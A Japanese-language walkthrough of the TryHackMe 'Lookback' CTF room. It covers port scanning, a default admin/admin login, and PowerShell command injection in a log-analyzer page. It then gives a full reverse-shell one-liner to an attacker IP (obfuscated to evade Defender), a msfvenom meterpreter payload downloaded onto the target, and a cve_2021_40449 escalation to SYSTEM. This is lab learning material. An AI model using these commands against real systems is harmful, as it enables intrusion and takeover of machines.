# Lookback CTF

https://tryhackme.com/room/lookback

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.54.5
root@ip-10-10-172-80:~# sudo nmap -nP -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-07 23:45 GMT
Nmap scan report for 10.10.54.5
Host is up (0.0092s latency).
Not shown: 65527 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3389/tcp open  ms-wbt-server
6410/tcp open  boe-resssvr4
MAC Address: 02:D7:6A:42:2F:31 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 109.69 seconds

root@ip-10-10-172-80:~# sudo nmap -nP -sV -p80,135,139,443,445,593,3389,6410 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-07 23:48 GMT
Nmap scan report for 10.10.54.5
Host is up (0.0081s latency).

PORT     STATE SERVICE        VERSION
80/tcp   open  http           Microsoft IIS httpd 10.0
135/tcp  open  msrpc          Microsoft Windows RPC
139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
443/tcp  open  ssl/https
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http     Microsoft Windows RPC over HTTP 1.0
3389/tcp open  ms-wbt-server?
6410/tcp open  msrpc          Microsoft Windows RPC
MAC Address: 02:D7:6A:42:2F:31 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.88 seconds
```

https://10.10.54.5/

```text
Server Error in '/' Application.
Runtime Error
Description: An application error occurred on the server. The current custom error settings for this application prevent the details of the application error from being viewed remotely (for security reasons). It could, however, be viewed by browsers running on the local server machine.

Details: To enable the details of this specific error message to be viewable on remote machines, please create a <customErrors> tag within a "web.config" configuration file located in the root directory of the current web application. This <customErrors> tag should then have its "mode" attribute set to "Off".


<!-- Web.Config Configuration File -->

<configuration>
    <system.web>
        <customErrors mode="Off"/>
    </system.web>
</configuration>


Notes: The current error page you are seeing can be replaced by a custom error page by modifying the "defaultRedirect" attribute of the application's <customErrors> configuration tag to point to a custom error page URL.


<!-- Web.Config Configuration File -->

<configuration>
    <system.web>
        <customErrors mode="RemoteOnly" defaultRedirect="mycustompage.htm"/>
    </system.web>
</configuration>
```

## dirsearch

```shell
$ dirsearch -u http://10.10.54.5/   
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/CTF/reports/http_10.10.54.5/__25-02-07_18-51-52.txt

Target: http://10.10.54.5/

[18:51:52] Starting: 
[18:51:55] 403 -  312B  - /%2e%2e//google.com
[18:51:56] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[18:52:28] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[18:54:57] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd      
[18:56:54] 302 -  206B  - /ecp/  ->  https://10.10.54.5/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.54.5%2fecp%2f&reason=0
[19:01:36] 401 -    0B  - /powershell/                                        
[19:01:57] 401 -    0B  - /rpc/                                               
[19:03:22] 403 -    1KB - /test/version_tmp/                                  
[19:03:22] 403 -    1KB - /test/reports
[19:03:22] 403 -    1KB - /test/tmp/                                          
[19:03:22] 403 -    1KB - /test/                                              
[19:03:22] 403 -    1KB - /test                                               
                                                                               
Task Completed
```

https://10.10.54.5/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.54.5%2fecp%2f&reason=0

で、Exchange Admin Center が表示される。

admin /admin でログインできるが、エラーで何も表示できない。

https://10.10.54.5/test/tmp/

でログインポップアップが出てきた。たぶん admin/ admin でログインできる。

https://10.10.54.5/test/ でフラグ１が表示された。

```text
This interface should be removed on production!
THM{......}
LOG ANALYZER
Path:
```

## /test ページ

```http
POST /test/ HTTP/2

（略）&xlog=/etc/passwd&Button=Run

↓

<pre>Get-Content : Cannot find path 'C:\etc\passwd' because it does not exist.
At line:1 char:1
+ Get-Content('C:\/etc/passwd')
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\etc\passwd:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
</pre>
```

```text
Get-Content('C:\/etc/passwd')
```
という形でアクセスしている。

Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config  
等を入力すると、ファイル内容を表示できるが、適当なファイルが見つからない。

```text
boot.ini'); dir; #
```
のようにするとコマンドインジェクションできた。

### リバースシェル

この md ファイルがDefenderに削除されるので１か所カタカナにしている。

```shell
boot.ini'); $client = New-Object System.Net.Sockets.TCPClient('10.2.22.182',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).ゲットバイツ($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() #
```

```shell
$ nc -nvlp 6666       
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.54.5] 13735
whoami
thm\admin
PS C:\windows\system32\inetsrv> 
```

シェル取得成功。

```shell
PS C:\Users> dir
    Directory: C:\Users
Mode                LastWriteTime         Length Name          
----                -------------         ------ ----
d-----        1/25/2023  12:54 PM                .NET v4.5
d-----        1/25/2023  12:54 PM                .NET v4.5 Classic
d-----        3/21/2023  11:40 AM                Administrator
d-----        2/21/2023  12:31 AM                dev
d-r---        1/25/2023   8:15 PM                Public
```

```shell
PS C:\inetpub> type ../Users/dev/Desktop/user.txt
THM{St........}
```

フラグ２ゲット。

## 権限昇格

```shell
PS C:\inetpub> type ../Users/dev/Desktop/TODO.txt
Hey dev team,

This is the tasks list for the deadline:

Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer[TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]


When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local
```

MS Exchange のセキュリティアップデートが済んでいないことを示唆している。

インストールソフト一覧。（言語パックの行は削除）

```ps
PS C:\windows\system32\inetsrv> wmic product get name,version,vendor
Name                                                                                  Vendor                 Version
Amazon SSM Agent                                                                      Amazon Web Services    3.2.582.0
Microsoft Exchange 2007 Enterprise Anti-spam Signatures                               Microsoft Corporation  3.3.4604.600
Microsoft Exchange Server                                                             Microsoft Corporation  15.2.858.5
Microsoft Unified Communications Managed API 4.0, Core Runtime 64-bit                 Microsoft Corporation  5.0.8308.0
Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.21005                         Microsoft Corporation  12.0.21005
Microsoft Server Speech Recognition Language - TELE (en-US)                           Microsoft Corporation  11.0.7400.345
Microsoft Lync Server 2013, Bootstrapper Prerequisites Installer Package              Microsoft Corporation  5.0.8308.0
Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.21005                            Microsoft Corporation  12.0.21005
Microsoft Server Speech Platform Runtime (x64)                                        Microsoft Corporation  11.0.7400.345
Microsoft Exchange 2007 Enterprise Block List Updates                                 Microsoft Corporation  3.3.4604.001
Microsoft Speech Platform VXML Runtime (x64)                                          Microsoft Corporation  11.0.7400.345
Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.50727                         Microsoft Corporation  11.0.50727
Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.50727                            Microsoft Corporation  11.0.50727
Microsoft Exchange 2007 Standard Anti-spam Filter Updates                             Microsoft Corporation  3.3.4604.600
Microsoft Unified Communications Managed API 4.0, SSP Runtime                         Microsoft Corporation  5.0.8308.0
Microsoft Server Speech Text to Speech Voice (en-US, Helen)                           Microsoft Corporation  11.0.7400.345
Microsoft Unified Communications Managed API 4.0, Runtime                             Microsoft Corporation  5.0.8308.0
```

```text
Microsoft Exchange Server                                                             Microsoft Corporation  15.2.858.5
```

このバージョンは、CVE-2024-21410 の特権昇格の脆弱性の対象に見えるが、たぶん実際にメール送受信できないと無理。

### metasploit

#### exploit(windows/http/exchange_proxylogon_rce)
```shell
msf6 exploit(windows/http/exchange_proxylogon_rce) > set EMAIL dev-infrastracture-team@thm.local
EMAIL => dev-infrastracture-team@thm.local
msf6 exploit(windows/http/exchange_proxylogon_rce) > set RHOSTS 10.10.193.185
RHOSTS => 10.10.193.185
msf6 exploit(windows/http/exchange_proxylogon_rce) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(windows/http/exchange_proxylogon_rce) > run

[*] Started reverse TCP handler on 10.2.22.182:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Using auxiliary/scanner/http/exchange_proxylogon as check
[-] https://10.10.193.185:443 - The target is not vulnerable to CVE-2021-26855.
[*] Scanned 1 of 1 hosts (100% complete)
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
```
失敗。

#### exploit(windows/http/exchange_proxyshell_rce)
```shell
msf6 exploit(windows/http/exchange_proxyshell_rce) > set EMAIL dev-infrastracture-team@thm.local
EMAIL => dev-infrastracture-team@thm.local
msf6 exploit(windows/http/exchange_proxyshell_rce) > set RHOSTS 10.10.193.185
RHOSTS => 10.10.193.185
msf6 exploit(windows/http/exchange_proxyshell_rce) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(windows/http/exchange_proxyshell_rce) > run

[*] Started reverse TCP handler on 10.2.22.182:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
```
失敗。

#### exploit(windows/http/exchange_proxynotshell_rce)
```shell
msf6 exploit(windows/http/exchange_proxynotshell_rce) > set USERNAME admin
USERNAME => admin
msf6 exploit(windows/http/exchange_proxynotshell_rce) > set PASSWORD admin
PASSWORD => admin
msf6 exploit(windows/http/exchange_proxynotshell_rce) > setg RHOSTS 10.10.193.185
RHOSTS => 10.10.193.185
msf6 exploit(windows/http/exchange_proxynotshell_rce) > setg LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(windows/http/exchange_proxynotshell_rce) > run

[*] Started reverse TCP handler on 10.2.22.182:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
```
失敗。

meterpreterへのアップグレードしてsuggesterを実行したい。

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.2.22.182 LPORT=9001 VERBOSE=true -f exe -o meterpreter.exe
```

```ps
PS C:\Users\public> Invoke-WebRequest -Uri http://10.2.22.182:8000/meterpreter.exe -outfile meterpreter.exe
```

```shell
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > exploit

meterpreter > 
```

meterpreter 取得。

```shell
meterpreter > run post/multi/recon/local_exploit_suggester

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.                                                                                                       
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.                                                                                                       
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.                                                                                                       
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!                                                           
 5   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.                                                                                                       
 6   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.                                                                                                       
 7   exploit/windows/local/cve_2020_17136                           Yes                      The target appears to be vulnerable. A vulnerable Windows 10 v1809 build was detected!                                                     
 8   exploit/windows/local/cve_2021_40449                           Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!                                                           
 9   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The target appears to be vulnerable.                                                                                                       
 10  exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.                                                                                                       
 11  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.                                                                                        
```

```shell
msf6 exploit(windows/local/cve_2021_40449) > set SESSION 2
SESSION => 2
msf6 exploit(windows/local/cve_2021_40449) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(windows/local/cve_2021_40449) > run

[*] Started reverse TCP handler on 10.2.22.182:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
[*] Launching netsh to host the DLL...
[+] Process 8672 launched.
[*] Reflectively injecting the DLL into 8672...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (201798 bytes) to 10.10.119.97
[*] Meterpreter session 3 opened (10.2.22.182:4444 -> 10.10.119.97:9622) at 2025-02-08 06:26:35 -0500

meterpreter > shell
Process 10684 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

権限昇格成功。

```shell
C:\Users\Administrator\Documents>type flag.txt
type flag.txt
THM{Loo......}
```

ルートフラグゲット。

## 振り返り

- admin / admin とか駄目元で手で打ってみるのも大事。
- Powershell では デフォルトで wget でファイル保存されないことを知らず長時間無駄にしたので覚えておく。
